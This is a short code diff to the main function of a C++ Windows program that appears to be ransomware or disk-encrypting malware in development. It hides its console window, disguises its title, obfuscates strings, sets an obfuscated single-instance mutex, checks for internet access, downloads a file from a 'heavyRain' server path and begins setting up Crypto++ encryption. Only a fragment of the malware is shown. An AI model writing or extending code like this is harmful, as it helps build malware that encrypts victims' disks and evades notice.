@@ -11,13 +11,12 @@
 #include "systeme.h"
 #include "diskEncryptor.h"
 #include "http.h"
-#include "toolkit.h"
 
-
+unsigned int threads = std::thread::hardware_concurrency();
 
 int main(void) {
 	::ShowWindow(::GetConsoleWindow(), DEBUG);
-	::SetConsoleTitleA(AY_OBFUSCATE("ntdll"));
+	::SetConsoleTitleA(AY_OBFUSCATE("		"));
 
 	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE("b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e"));
 	if (ERROR_ALREADY_EXISTS == GetLastError()) {
@@ -42,11 +41,11 @@ int main(void) {
 	checkFile << CHECK_KEY;
 	checkFile.close();
 	*/
-	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
-	if (http.checkInternetConnection() != S_OK) {
+	if (Http::checkInternetConnection() != S_OK) {
 		std::cout << "No internet connection\n";
 		return 1;
 	}
+	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
 	std::cout << http.downloadFile(L"localhost", L"/server/heavyRain/dlTest.txt", L"Content-Type: application/x-www-form-urlencoded\r\n", L"testDown.txt");
 
 	CryptoPP::AutoSeededRandomPool prng;
